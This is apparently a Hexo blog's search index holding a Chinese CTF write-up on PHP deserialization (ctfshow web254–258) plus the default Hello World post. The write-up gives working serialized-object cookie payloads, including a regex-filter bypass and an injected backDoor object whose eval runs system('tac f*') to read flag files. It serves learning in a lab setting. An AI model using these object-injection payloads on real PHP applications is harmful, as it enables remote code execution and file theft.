<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/04/20/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2024/04/20/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h2 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h2><p>这关很简单虽然在反序列化里但是这关并没有反序列化直接payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">username</span>=xxxxxx&amp;password=xxxxxx<br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="https://raw.githubusercontent.com/ljhflag/mypic/img/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-21%20165212.png" alt="屏幕截图 2024-03-21 165212"></p><h2 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h2><p>这关主要的判断条件是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))<span class="hljs-comment">//检查是否存在get传参</span><br>&#123;<br>  <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<span class="hljs-comment">//反序列化传入的cookie参数user</span><br>  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))<span class="hljs-comment">//调用对象中的login方法</span><br>  &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">checkVip</span>())<span class="hljs-comment">//检查是否为vip</span><br>    &#123;<br>      <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">vipOneKeyGetFlag</span>();<span class="hljs-comment">//调用这个方法来输出flag</span><br>    &#125;<br></code></pre></td></tr></table></figure><p>开始整理思路首先需要有个get传参然后要有个已经序列化且符合条件的对象还要使用cookie传参</p><p>开始先构造user需要使用代码来完成序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span> = <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> ctfShowUser);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>这样构造的原理是如果我们想要获取cookie的话要通过验证证明自己是vip那么就需要我们get传入的参数符合cookie所以get传入</p><p>?username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx</p><p>其次是我们传入带有正确的用户名和密码的cookie应该是反序列化的还有一点是将原来类里的属性$isvip的值改为ture这样才能说明此用户为vip只有vip能拿到flag还有一点经过反序列化的cookie应该在进行url编码、</p><p>（因为对于 Cookie，由于它经常用于存储用户会话信息等，而这些信息可能包含各种字符，包括一些在 URL 中有特殊含义的字符，比如空格、等号等。如果不对这些特殊字符进行编码，就有可能导致 URL 解析出错，从而影响到服务器端对 Cookie 的正确处理。）</p><p>开始实操：（进行反序列化的时候使用在线的php工具即可<a href="https://www.jyshare.com/compile/1/%EF%BC%89">https://www.jyshare.com/compile/1/）</a></p><p>如图：</p><p><img src="https://raw.githubusercontent.com/ljhflag/mypic/img/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-22%20162903.png" alt="屏幕截图 2024-03-22 162903"></p><p>然后进行get传参和cookie传参 如图：</p><p><img src="https://raw.githubusercontent.com/ljhflag/mypic/img/img/202404201842445.png" alt="屏幕截图 2024-03-22 155736"></p><h2 id="web-256"><a href="#web-256" class="headerlink" title="web 256"></a>web 256</h2><p>这关和上一关的区别是在在使用了全局变量$flag后又加了一层验证 如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-22%20171142.png" alt="屏幕截图 2024-03-22 171142"></p><p>意思是要我们的username和password不能相等</p><p>开搞：只要在上一关的基础上把用户名和密码改一下只要不相等即可</p><p>我把password少了一个x</p><p>构造cookie方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;xxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span> = <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> ctfShowUser);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;user=<span class="hljs-subst">$a</span>&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;user=&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-22%20171745.png" alt="屏幕截图 2024-03-22 171745"></p><p>get传参：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">username</span>=xxxxxx&amp;password=xxxxx<br></code></pre></td></tr></table></figure><p>cookie传参：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">user</span>=O%<span class="hljs-number">3</span>A11%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>ctfShowUser%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>username%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>xxxxxx%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>password%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>xxxxx%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>isVip%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><p>将他们传上去即可 如图：</p><p>![屏幕截图 2024-03-22 170844](<a href="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://gitee.com/dvvss/images/raw/master/imags/屏幕截图</a> 2024-03-22 170844.png)</p><h2 id="web-257"><a href="#web-257" class="headerlink" title="web 257"></a>web 257</h2><p>这关只是去看代码的话发现并不会输出什么东西也没有输出的代码但是但我们把他的代码全部看完后发现有一个类并没有被使用 如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>哈哈看到了一个特别有用的函数eval()这个函数可以执行任何代码 这是我们的一个可以利用来输出flag的点那这个点有了因为这关只接受两种传参方式get只能去传username和password</p><p>因此我们选择去利用cookie传参来实现来实现接下来开始构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$isVip</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span> = <span class="hljs-title">new</span> <span class="hljs-title">backDoor</span>();</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">    <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">__destruct</span>()</span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>-&gt;<span class="hljs-title">getInfo</span>();</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">backDoor</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">//private $code = &#x27;system(&quot;cat flag.php&quot;);&#x27;;//注意要两个分号</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&#x27;system(&quot;tac f*&quot;);&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;user=<span class="hljs-subst">$b</span>&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;user=&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);<br></code></pre></td></tr></table></figure><p>关于为什么必须要使用两个分号的解释：</p><p>第一个分号是在字符串 <code>&#39;system(&quot;tac f*&quot;);&#39;</code> 中的。这个字符串实际上是赋值给 <code>$code</code> 属性的值。</p><p>第二个分号是在实际的赋值语句 <code>private $code = &#39;system(&quot;tac f*&quot;);&#39;;</code> 中的，它表示这个语句的结束。</p><p>get传的用户名和密码只要有就ok不管是什么</p><p>为什么在以上代码使用tac可以但是cat就不行我个人认为是因为他们所需要的权限不同所以当尝试cat不行的时候可以去试试tac</p><p>还有f*为通配符可以匹配所有以f为开头的文件,还有在php中一个双引号中不能包含另一个双引号如果有的话一定要转义一下</p><p>还有一个误区就是tac命令的逆序显示文件的内容的意思是把文件的每一句话原来的顺序给逆序不是把一句话中的代码给逆序输出举个例子：</p><p>tes.txt的内容是</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">hello world<br><span class="hljs-built_in">get</span> flag<br>how are you<br></code></pre></td></tr></table></figure><p>那么使用tac把他逆序输出就是：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">how are you<br><span class="hljs-built_in">get</span> flag<br>hello world<br></code></pre></td></tr></table></figure><p>所以不需要担心读出来的文件不认识</p><h2 id="web-258"><a href="#web-258" class="headerlink" title="web 258"></a>web 258</h2><p>​       这关和上一关的差别是在上一关的基础上对我们输入的cookie进行了正则匹配还有一点上一关的类中存在私有属性而这一关是共有属性在进行构造代码的时候要注意如果误写成了私有属性可能会导致flag获取失败</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span> = <span class="hljs-title">new</span> <span class="hljs-title">backDoor</span>();</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">    <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">__destruct</span>()</span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>-&gt;<span class="hljs-title">getInfo</span>();</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">backDoor</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">//private $code = &#x27;system(&quot;cat flag.php&quot;);&#x27;;//注意要两个分号</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&#x27;system(&quot;tac f*&quot;);&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;user=<span class="hljs-subst">$b</span>&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;user=&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);<br></code></pre></td></tr></table></figure><p>然后使用输出中的已经反序列化的$a：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">user</span>=O:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;ctfShowUser&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;xxxxxx&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;xxxxxx&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVip&quot;</span>;b:<span class="hljs-number">0</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;class&quot;</span>;O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;backDoor&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;code&quot;</span>;s:<span class="hljs-number">17</span>:<span class="hljs-string">&quot;system(&quot;</span>tac f*<span class="hljs-string">&quot;);&quot;</span>;&#125;&#125;<br></code></pre></td></tr></table></figure><p>因为这关对我们输入进行了正则匹配 如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-23%20193922.png" alt="屏幕截图 2024-03-23 193922"></p><p>解释：在&#x2F; &#x2F;之间的是正则匹配表达式</p><p>&#x2F;[oc]:其中的[]表示一个集合oc表示集合中的元素:就表示冒号；整体来说是匹配o:或者c:</p><p>\d+表示匹配多个数字 其中的\d表示一个元字符，表示匹配任意一个元字符，+是一个量词，表示可以匹配多个元字符</p><p>最后的i表示不区分大小写</p><p>举个例子以上的正则匹配表达式匹配的内容是：C:1212 和O:2312</p><p>所以我们要在上面原来的cookie的基础上再加上点东西让他匹配不到可以加上+号因为在数字的前面加上+只是表示这个是数字是正数对它的内容没有影响</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:+<span class="hljs-number">11</span>:<span class="hljs-string">&quot;ctfShowUser&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;xxxxxx&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;xxxxxx&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVip&quot;</span>;b:<span class="hljs-number">0</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;class&quot;</span>;O:+<span class="hljs-number">8</span>:<span class="hljs-string">&quot;backDoor&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;code&quot;</span>;s:<span class="hljs-number">17</span>:<span class="hljs-string">&quot;system(&quot;</span>tac f*<span class="hljs-string">&quot;);&quot;</span>;&#125;&#125;<br></code></pre></td></tr></table></figure><p>注意：有两个o在第一个类的属性中还存在一个类 应该把他们都加上+符号</p><p>然后不要忘了还有再进行一下url编码</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">user</span>=O%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>B11%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>ctfShowUser%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>username%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>xxxxxx%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>password%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>xxxxxx%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>isVip%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>class%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>B8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>backDoor%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>code%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A17%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>system%<span class="hljs-number">28</span>%<span class="hljs-number">22</span>tac+f%<span class="hljs-number">2</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><p>cookie传参即可</p><p>至于get传参只要有用户名和密码即可不管传啥</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-23%20200417.png" alt="屏幕截图 2024-03-23 200417"></p><h2 id="web-259"><a href="#web-259" class="headerlink" title="web 259"></a>web 259</h2>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/04/20/hello-world/"/>
    <url>/2024/04/20/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
